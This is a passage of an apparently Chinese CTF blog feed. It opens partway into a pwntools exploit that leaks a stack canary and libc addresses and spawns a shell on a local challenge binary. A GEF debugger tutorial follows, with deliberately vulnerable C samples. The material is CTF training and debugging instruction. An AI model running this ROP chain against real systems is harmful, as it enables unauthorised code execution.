class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;scv&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;scv&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400ea3</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x0400a96</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">feed</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>))</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>))</span><br><span class="line">    p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_canary</span>():</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>))</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="comment">#trash data</span></span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa9</span>))</span><br><span class="line">    <span class="comment">#canary</span></span><br><span class="line">    canary=p.recv(<span class="number">7</span>)</span><br><span class="line">    canary=<span class="string">b&#x27;\x00&#x27;</span>+canary</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Succuss Leaked Canary&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>))</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    feed(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa9</span>)</span><br><span class="line">    found_canary=leak_canary()</span><br><span class="line">    <span class="built_in">print</span>(found_canary)</span><br><span class="line">    <span class="comment">#leak real addr</span></span><br><span class="line">    rop=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa8</span>+found_canary+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">    <span class="comment">#effective overflow</span></span><br><span class="line">    context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    feed(rop)</span><br><span class="line">    leave()</span><br><span class="line">    <span class="built_in">print</span>(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>))</span><br><span class="line">    puts_addr=p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;found puts_addr:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(u64(puts_addr))))</span><br><span class="line">    puts_addr=u64(puts_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell address</span></span><br><span class="line">    <span class="comment">#high version of libc should ret before get shell</span></span><br><span class="line">    libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;/bin/sh :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(bin_sh)))</span><br><span class="line">    system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;system: &quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(system_addr)))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#ret addr --Stack Pivoting</span></span><br><span class="line">    ret=<span class="number">0x00000000004008b1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#payload</span></span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa8</span>+found_canary+p64(<span class="number">0xdeadbeef</span>)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)</span><br><span class="line">    feed(payload)</span><br><span class="line">    leave()</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> read document </tag>
            
            <tag> training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-Quick Start For GDB-gef</title>
      <link href="/2022/12/30/pwn-gdbgef/"/>
      <url>/2022/12/30/pwn-gdbgef/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a class="markdownIt-Anchor" href="#简述"></a> 简述：</h2><p>让gdb能够在X86,ARM,MIPS,PowerPC,SPARC等框架上进行更为便利，功能更强大的开发利用；主要针对的人群是漏洞开发利用者和逆向工程师，使用PythonAPI给GDB提供了新特性来辅助我们动态分析和利用开发。</p><ul><li>支持Python2和Python3<blockquote><p>虽然说是两个版本都支持，但是python2完全支持版本在2020.3就停止了更新，对应的版本是<code>gef-legacy</code></p></blockquote></li><li>简单的GDB单脚本运行</li><li>不需要额外的依赖、简易的安装</li><li>代码优化、极速运行</li><li>命令易拓展</li><li>抽象架构兼容，所有命令都能够在不同架构起到作用</li></ul><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><h3 id="简易安装gef"><a class="markdownIt-Anchor" href="#简易安装gef"></a> 简易安装<code>gef</code></h3><p>这里只介绍最常用的，其余的安装方法跳转<a href="https://hugsy.github.io/gef/install/">Gef Installation</a></p><ul><li>通过远程获取脚本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gef.blah.cat/sh)</span>&quot;</span></span><br></pre></td></tr></table></figure></li><li>通过git<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone --branch dev https://github.com/hugsy/gef.git</span><br><span class="line">$ echo source `pwd`/gef/gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure></li></ul><h3 id="gef-extras拓展安装"><a class="markdownIt-Anchor" href="#gef-extras拓展安装"></a> <code>gef-extras</code>拓展安装</h3><p>这个不属于官方，是贡献者提交的拓展包，可选安装</p><ul><li>通过远程获取脚本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;<span class="subst">$(wget https://github.com/hugsy/gef/raw/main/scripts/gef-extras.sh -O -)</span>&quot;</span></span><br></pre></td></tr></table></figure></li><li>通过git<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git clone --branch main https://github.com/hugsy/gef-extras.git</span><br><span class="line">$ gdb -ex &#x27;gef config gef.extra_plugins_dir &quot;/path/to/gef-extras/scripts&quot;&#x27; -ex &#x27;gef save&#x27; -ex quit</span><br></pre></td></tr></table></figure></li></ul><h3 id="更新方法"><a class="markdownIt-Anchor" href="#更新方法"></a> 更新方法</h3><p>不一定是<code>gdbinit-gef</code>,找到加载脚本文件跟<code>--update</code>参数执行更新就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ~/.gdbinit-gef.py --update</span><br></pre></td></tr></table></figure><h3 id="卸载方法"><a class="markdownIt-Anchor" href="#卸载方法"></a> 卸载方法</h3><ul><li>软卸载（取消GDB配置文件加载）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb -nx</span><br></pre></td></tr></table></figure><blockquote><p>取消~/.gdbinit配置文件的加载，默认启动就不会载入gef</p></blockquote></li><li>软卸载（从GDB配置文件移除脚本路径）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinit</span><br><span class="line"># 注释掉脚本</span><br></pre></td></tr></table></figure></li><li>卸载<blockquote><p>要完全卸载掉脚本很简单，因为gef是一个单文件GDB脚本；如果还额外配置了配置文件也可选删除，通常路径是<code>~/.gef.rc</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm ~/&#123;my-gef-script-file&#125; ~/&#123;my-gef-config-file&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="基础命令"><a class="markdownIt-Anchor" href="#基础命令"></a> 基础命令</h2><h3 id="自定义别名"><a class="markdownIt-Anchor" href="#自定义别名"></a> 自定义别名</h3><p>可以自定义别名</p><ul><li>用法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#添加别名</span><br><span class="line">aliases add [alias] [command]</span><br><span class="line">#删除别名</span><br><span class="line">aliases rm [alias]</span><br><span class="line">#列举所有别名</span><br><span class="line">aliases list</span><br></pre></td></tr></table></figure></li></ul><h3 id="gef-config配置"><a class="markdownIt-Anchor" href="#gef-config配置"></a> gef config配置</h3><p>很常用的命令，可以修改一些程序默认行为、开启关闭程序功能、添加<code>Gef-Extras</code>拓展包；默认情况下程序的配置属性都保存在<code>~/.gef.rc</code></p><ul><li>用法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 修改配置</span><br><span class="line">gef config [property] [value]</span><br><span class="line"></span><br><span class="line"># 保存配置</span><br><span class="line">gef save</span><br><span class="line"></span><br><span class="line"># 热加载配置</span><br><span class="line">gef restore</span><br></pre></td></tr></table></figure></li></ul><h3 id="context上下文"><a class="markdownIt-Anchor" href="#context上下文"></a> context上下文</h3><p>对调试时的视窗进行编辑</p><ul><li>可以参考<a href="https://hugsy.github.io/gef/api/">API</a>文档进行pane拓展</li><li>关闭视窗(pane)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef config context.layout</span><br><span class="line">context.layout (str) = &quot;legend regs stack code args source memory threads trace extra&quot;</span><br><span class="line"></span><br><span class="line">#如果我要关闭这里的threads视窗，只需要在前面加上-</span><br><span class="line">#关闭threads视窗</span><br><span class="line">gef config context.layout &quot;legend regs stack code args source memory -threads trace extra&quot;</span><br></pre></td></tr></table></figure></li></ul><p>一个比较有意思的东西：</p><ul><li>重定向context输出到其他tty/file<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#在要显示的交互窗口输入tty获取到tty接口</span><br><span class="line">gef config context.redirect /dev/pts/0</span><br><span class="line"></span><br><span class="line">#恢复默认设置</span><br><span class="line">gef config context.redirect &quot;&quot;</span><br></pre></td></tr></table></figure></li></ul><h3 id="hexdump格式化dump数据"><a class="markdownIt-Anchor" href="#hexdump格式化dump数据"></a> hexdump格式化dump数据</h3><p>Linux上面也有个<code>hexdump</code>命令，两个好像都差不多，只是用法不太一样</p><ul><li>用法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump [qword|dword|word|byte] [-h] [--reverse] [--size SIZE] [address]</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hexdump byte --size 50 $pc</span><br><span class="line"></span><br><span class="line">0x0000555555555183 &lt;main+003a&gt;    48 b9 57 6f 72 6c 64 21 21 00 48 89 48 06 b8 00    H.World!!.H.H...</span><br><span class="line">0x0000555555555193 &lt;main+004a&gt;    00 00 00 c9 c3 f3 0f 1e fa 48 83 ec 08 48 83 c4    .........H...H..</span><br><span class="line">0x00005555555551a3 &lt;_fini+000b&gt;    08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................</span><br><span class="line">0x00005555555551b3     00 00             ..</span><br></pre></td></tr></table></figure><h3 id="指定文字段高亮"><a class="markdownIt-Anchor" href="#指定文字段高亮"></a> 指定文字段高亮</h3><p><code>highlight</code> Alias <code>hl</code></p><ul><li>基础文字信息高亮<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight [add|remove|list|clear] </span><br></pre></td></tr></table></figure></li><li>启用正则表达式高亮<blockquote><p>这个得看需求高不高，不高建议还是关闭了，对性能有影响</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef config highlight.regex 1</span><br></pre></td></tr></table></figure></li><li>使用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hl add 41414141 blue</span><br><span class="line">#启用了regex就在文字端写入正则表达</span><br></pre></td></tr></table></figure></li></ul><h3 id="hijack-fd-通道劫持"><a class="markdownIt-Anchor" href="#hijack-fd-通道劫持"></a> hijack-fd 通道劫持</h3><p>这样说不知道好不好理解，就是把通道描述符连接重定向到指定文件；这里的“文件”不一定是文件，可以是一个socket接口，也可以是<code>ip:port</code>的形式</p><ul><li>用法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hijack-fd [fdnum] [newfile]</span><br></pre></td></tr></table></figure></li><li>例子<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hijack-fd 0 /dev/null</span><br><span class="line"></span><br><span class="line">hijack-fd 1 localhost:2710</span><br></pre></td></tr></table></figure></li></ul><h3 id="pattern找偏移"><a class="markdownIt-Anchor" href="#pattern找偏移"></a> pattern找偏移</h3><ul><li>创建字段<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern create -n 4 100</span><br></pre></td></tr></table></figure>等同于<code>pwntools</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload=cyclic(<span class="number">100</span>,n=<span class="number">4</span>)</span><br></pre></td></tr></table></figure></li><li>根据字段搜索偏移<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pattern search [addr]</span><br><span class="line"></span><br><span class="line">#addr可以是0xdeadbeef、$sp、&#x27;aaacbf&#x27;这样的格式</span><br></pre></td></tr></table></figure></li></ul><h3 id="加载库和segment字段显示"><a class="markdownIt-Anchor" href="#加载库和segment字段显示"></a> 加载库和segment字段显示</h3><p><code>xfiles</code>默认显示从lib加载的内容和segment内容，<code>info files</code>有同样的效用，但是<code>xfiles</code>在显示上做了调整</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#显示所有上述内容</span><br><span class="line">xfiles</span><br><span class="line">#过滤只加载.plt segment</span><br><span class="line">xfiles .plt</span><br></pre></td></tr></table></figure><blockquote><p>我这边电脑不知道为什么.plt不输出</p></blockquote><h3 id="elf信息查看"><a class="markdownIt-Anchor" href="#elf信息查看"></a> elf信息查看</h3><p>提供显示有限的elf信息子集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ elf-info</span><br></pre></td></tr></table></figure><p>效果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Magic                 : 7f 45 4c 46</span><br><span class="line">Class                 : 0x2 - ELF_64_BITS</span><br><span class="line">Endianness            : 0x1 - LITTLE_ENDIAN</span><br><span class="line">Version               : 0x1</span><br><span class="line">OS ABI                : 0x0 - SYSTEMV</span><br><span class="line">ABI Version           : 0x0</span><br><span class="line">Type                  : 0x2 - ET_EXEC</span><br><span class="line">Machine               : 0x3e - X86_64</span><br><span class="line">Program Header Table  : 0x00000000000040</span><br><span class="line">Section Header Table  : 0x00000000001190</span><br><span class="line">Header Table          : 0x00000000000040</span><br><span class="line">ELF Version           : 0x1</span><br><span class="line">Header size           : 64 (0x40)</span><br><span class="line">Entry point           : 0x000000004005d0</span><br><span class="line">--------------Program Header--------------</span><br><span class="line">...</span><br><span class="line">--------------Section Header--------------</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="安全属性查看"><a class="markdownIt-Anchor" href="#安全属性查看"></a> 安全属性查看</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec</span><br></pre></td></tr></table></figure><p>效果如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Canary                        : ✘ </span><br><span class="line">NX                            : ✓ </span><br><span class="line">PIE                           : ✘ </span><br><span class="line">Fortify                       : ✘ </span><br><span class="line">RelRO                         : Partial</span><br></pre></td></tr></table></figure><h2 id="调试运行前置"><a class="markdownIt-Anchor" href="#调试运行前置"></a> 调试运行前置</h2><h3 id="入口调试"><a class="markdownIt-Anchor" href="#入口调试"></a> 入口调试</h3><p><code>entry-break</code> Alias <code>start</code>，我们在上一步<code>elf-info</code>可以看到ELF信息的<code>Entry point</code>，这个指令的作用就是进入程序入口然后设置断点，方便我们进行下一步动态调试</p><ul><li>用法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry-break</span><br></pre></td></tr></table></figure></li></ul><h3 id="函数汇编"><a class="markdownIt-Anchor" href="#函数汇编"></a> 函数汇编</h3><p><code>disassemble</code>指令，可以以汇编码的形式来显示对应函数</p><ul><li>函数查看<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info functions</span><br></pre></td></tr></table></figure></li><li>查看时显示机器码<blockquote><p>这个很方便，在有特殊需求的时候很实用</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disassemble -r main</span><br></pre></td></tr></table></figure></li></ul><h3 id="虚拟内存映射"><a class="markdownIt-Anchor" href="#虚拟内存映射"></a> 虚拟内存映射</h3><p><code>vmmap</code>查看虚拟内存映射页</p><ul><li>gef内指令<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br><span class="line">vmmap stack #只显示栈内存页</span><br></pre></td></tr></table></figure>效果如下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x00000000400000 0x00000000401000 0x00000000000000 r-x /home/andy/Workspace/mylab/brop/a.out</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>通过<code>Linux proc</code>虚拟文件系统<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/`pidof &#123;file&#125;`/smaps</span><br></pre></td></tr></table></figure></li></ul><h3 id="指定位置信息"><a class="markdownIt-Anchor" href="#指定位置信息"></a> 指定位置信息</h3><p><code>xinfo</code>用于检索并显示指定位置（给定参数）的信息</p><ul><li>用法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xinfo $pc #查看程序计数器</span><br><span class="line">xinfo $sp #查看堆栈指针</span><br></pre></td></tr></table></figure></li><li>效果如下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Page: 0x00000000400000  →  0x00000000401000 (size=0x1000)</span><br><span class="line">Permissions: r-x</span><br><span class="line">Pathname: </span><br><span class="line">Offset (from page): 0x6c1</span><br><span class="line">Inode: 419192</span><br><span class="line">Segment: .text (0x000000004005d0-0x000000004007d2)</span><br><span class="line">Offset (from segment): 0xf1</span><br><span class="line">Symbol: main+4</span><br></pre></td></tr></table></figure></li></ul><h3 id="地址信息递归显示"><a class="markdownIt-Anchor" href="#地址信息递归显示"></a> 地址信息递归显示</h3><p><code>dereference</code> Alias <code>telescope</code>，比较像WinGDB的<code>dps</code>;作用就是小标题的描述</p><ul><li>用法<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ telescope $pc -l1</span><br><span class="line">$ telescope $sp -l20 #查看当前栈空间</span><br></pre></td></tr></table></figure></li><li>效果如下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000004006c1│+0x0000: &lt;main+4&gt; mov rax, QWORD PTR [rip+0x2009a0]        # 0x601068 &lt;stdin@@GLIBC_2.2.5&gt; ← $rip</span><br></pre></td></tr></table></figure></li></ul><h2 id="漏洞检测"><a class="markdownIt-Anchor" href="#漏洞检测"></a> 漏洞检测</h2><p>这里以检测字符串格式化漏洞和glibc堆实现常见漏洞攻击为例</p><h3 id="字符串格式化漏洞"><a class="markdownIt-Anchor" href="#字符串格式化漏洞"></a> 字符串格式化漏洞</h3><ol><li>首先创建一个简单的漏洞程序<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;hello &quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(argv[<span class="number">1</span>]);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>编译为可执行文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># gcc -o printf printf.c</span><br><span class="line">or</span><br><span class="line"># make printf</span><br></pre></td></tr></table></figure></li><li>自动设置有用的分析断点<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">format-string-helper</span><br></pre></td></tr></table></figure></li><li>开始运行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run world</span><br><span class="line">[*] Format string helper</span><br><span class="line">Possible insecure format string: printf(&#x27;$rdi&#x27;  →  0x555555556004: &#x27;hello &#x27;)</span><br><span class="line">Reason: Call to &#x27;printf()&#x27; with format string argument in position #0 is in page 0x555555556000 (.rodata) that has write permission</span><br></pre></td></tr></table></figure>可以看到自动检测出了可能存在的字符串格式化漏洞并且详细列出了Reason</li></ol><h3 id="堆检测"><a class="markdownIt-Anchor" href="#堆检测"></a> 堆检测</h3><ul><li>只能检测一些常见的堆漏洞<ul><li>Double-Free</li><li>Use-After-Free</li><li>Null-Free</li><li>…</li></ul></li></ul><ol><li>Use After Free为例： 源程序<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">     <span class="type">char</span> *p=<span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">     <span class="built_in">free</span>(p);</span><br><span class="line">     <span class="built_in">strcpy</span>(p,<span class="string">&quot;Hello World!!&quot;</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>编译，略</li><li>和<code>format-string-helper</code>一样运行助手脚本<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">heap-analysis-helper</span><br><span class="line"></span><br><span class="line">[*] This feature is under development, expect bugs and unstability...</span><br><span class="line">[+] Tracking malloc() &amp; calloc()</span><br><span class="line">[+] Tracking free()</span><br><span class="line">[+] Tracking realloc()</span><br><span class="line">[+] Disabling hardware watchpoints (this may increase the latency)</span><br><span class="line">[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.</span><br><span class="line">[*] Note: The heap analysis slows down the execution noticeably.</span><br><span class="line"></span><br><span class="line">gef config heap-analysis-helper.check_uaf</span><br><span class="line">#确保改检测属性在打开状态</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line">#continue</span><br><span class="line">[*] Heap-Analysis</span><br><span class="line">Possible Use-after-Free in &#x27;/home/andy/Workspace/mylab/gef-debug/heap&#x27;: pointer 0x5555555592a0 was freed, but is attempted to be used at 0x555555555176</span><br><span class="line">0x555555555176   movabs rdx, 0x6f57206f6c6c6548</span><br></pre></td></tr></table></figure></li></ol><h3 id="more"><a class="markdownIt-Anchor" href="#more"></a> More</h3><p>支持的不止上面距离，可以自行翻阅官方文档</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-BROP concept and example</title>
      <link href="/2022/12/25/pwn-BROP/"/>
